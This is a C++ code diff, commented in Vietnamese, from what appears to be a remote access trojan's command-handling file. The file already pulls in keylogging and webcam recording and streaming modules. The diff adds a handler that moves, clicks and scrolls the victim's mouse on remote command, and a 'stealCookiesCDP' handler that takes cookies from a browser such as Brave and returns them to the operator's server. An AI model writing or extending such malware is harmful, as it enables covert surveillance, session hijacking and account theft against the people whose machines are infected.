@@ -6,6 +6,8 @@
 #include "Keylogging.h"
 #include "WebcamRecord.h"
 #include "WebcamStream.h"
+#include "MouseControl.h"
+#include "CdpStealer.h"
 
 // Helper: Trả về JSON status chuẩn
 json ProcessHandlers::makeStatus(bool success, const std::string &msg, json extra)
@@ -169,4 +171,55 @@ json ProcessHandlers::systemRestart(const json &)
 {
     std::system("shutdown /r /t 0");
     return makeStatus(true, "Restart command sent");
+}
+
+// === MOUSE CONTROL (Thêm section này vào cuối file hoặc chỗ phù hợp) ===
+json ProcessHandlers::handleMouseInput(const json &req)
+{
+    std::string action = req.value("action", "");
+
+    // 1. Di chuyển chuột
+    if (action == "move")
+    {
+        // Client gửi x, y dưới dạng float (0.0 -> 1.0)
+        double x = req.value("x", 0.0);
+        double y = req.value("y", 0.0);
+        MouseControl::Move(x, y);
+    }
+    // 2. Click chuột (mousedown/mouseup)
+    else if (action == "click")
+    {
+        std::string btn = req.value("button", "left");
+        std::string state = req.value("state", "down"); // down hoặc up
+        MouseControl::Action(btn, state);
+    }
+    // 3. Cuộn chuột
+    else if (action == "scroll")
+    {
+        int delta = req.value("delta", 0);
+        MouseControl::Scroll(delta);
+    }
+
+    // Không cần phản hồi JSON để tối ưu tốc độ, hoặc trả về null
+    return {};
+}
+
+json ProcessHandlers::stealCookiesCDP(const json &req)
+{
+    std::string browser = req.value("browser", "brave");
+
+    // Gọi hàm Static trong CdpStealer
+    json result = CdpStealer::StealCookiesViaCDP(browser);
+
+    if (result["status"] == "error")
+    {
+        return makeStatus(false, result["message"]);
+    }
+
+    // Gửi thẳng kết quả về Server (dạng JSON đã xử lý sẵn)
+    // Cấu trúc gói tin trả về
+    return {
+        {"type", "cookies_result"}, // Tận dụng type cũ để Web UI hiểu
+        {"browser", browser},
+        {"data", result["data"]}};
 }
